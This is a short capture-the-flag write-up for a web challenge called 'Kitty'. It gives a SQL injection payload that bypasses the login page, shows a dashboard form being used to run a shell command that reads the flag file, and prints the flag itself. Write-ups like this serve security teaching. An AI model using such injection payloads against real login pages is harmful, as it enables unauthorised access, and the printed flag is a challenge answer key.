# Kitty
> Tetanus is a serious, potentially life-threatening infection that can be transmitted by an animal bite.

## About the Challenge
We got a website without the source code, and on this website it looks like we need to bypass the login page

*[Image: preview]*

## How to Solve?
The login page is vulnerable to SQL injection, to bypass the login page we need to input this username and password:

```
U: admin" or true-- -
P: test
```

*[Image: bypass]*

And then inside the dashboard, there is another form where we can execute OS command

*[Image: form]*

To obtain the flag, input `cat flag.txt`

*[Image: flag]*

```
KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}
```